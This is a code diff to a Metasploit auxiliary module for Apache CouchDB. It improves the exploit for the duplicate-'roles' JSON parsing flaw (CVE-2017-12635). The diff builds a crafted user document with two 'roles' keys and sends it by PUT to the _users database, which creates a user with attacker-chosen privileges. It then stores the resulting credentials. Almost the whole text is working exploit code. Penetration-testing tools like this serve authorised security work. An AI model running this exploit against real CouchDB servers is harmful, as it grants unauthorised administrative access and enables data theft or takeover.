@@ -230,30 +230,53 @@ class MetasploitModule < Msf::Auxiliary
     username = datastore['HttpUsername']
     password = datastore['HttpPassword']
     roles = datastore['ROLES']
-    timeout = datastore['TIMEOUT']
+    user_id = "org.couchdb.user:#{username}"
 
-    data = %({
-"type": "user",
-"name": "#{username}",
-"roles": ["#{roles}"],
-"roles": [],
-"password": "#{password}"
-})
+    # The duplicate keys exploit the two JSON parsers; encode values separately
+    # so a normal Hash serializer cannot discard the first roles key.
+    # https://docs.couchdb.org/en/stable/cve/2017-12635.html
+    data = <<~JSON
+      {"type":"user","name":#{username.to_json},"roles":#{[roles].to_json},"roles":[],"password":#{password.to_json}}
+    JSON
     res = send_request_cgi(
-      {
-        'uri' => "/_users/org.couchdb.user:#{username}", # http://hostname:port/_users/org.couchdb.user:username
-        'method' => 'PUT',
-        'ctype' => 'text/json',
-        'data' => data
-      }, timeout
+      'uri' => normalize_uri('_users', "org.couchdb.user:#{Rex::Text.uri_encode(username)}"),
+      'method' => 'PUT',
+      'ctype' => 'application/json',
+      'data' => data
     )
 
-    unless res && res.code == 200
-      print_error("#{peer} - Change Failed")
-      return
+    unless res && [200, 201].include?(res.code)
+      reason = res ? "HTTP #{res.code}" : 'No response'
+      print_error("Failed to create CouchDB user #{username.inspect}: #{reason}")
+      return false
     end
 
+    result = res.get_json_document
+    unless result.is_a?(Hash) && result['ok'] == true && result['id'] == user_id
+      print_error("Failed to create CouchDB user #{username.inspect}: Unexpected creation acknowledgement")
+      return false
+    end
+
+    create_credential_and_login(
+      address: rhost,
+      port: rport,
+      protocol: 'tcp',
+      service_name: 'couchdb',
+      workspace_id: myworkspace_id,
+      origin_type: :service,
+      module_fullname: fullname,
+      username: username,
+      private_type: :password,
+      private_data: password,
+      status: Metasploit::Model::Login::Status::UNTRIED,
+      proof: res.body
+    )
     print_good("#{peer} - User #{username} created with password #{password}. Connect to #{full_uri('/_utils/')} to login.")
+    true
+  rescue Rex::ConnectionError => e
+    elog('CouchDB user creation request failed', error: e)
+    print_error("Failed to create CouchDB user #{username.inspect}: Connection failed")
+    false
   end
 
   def run
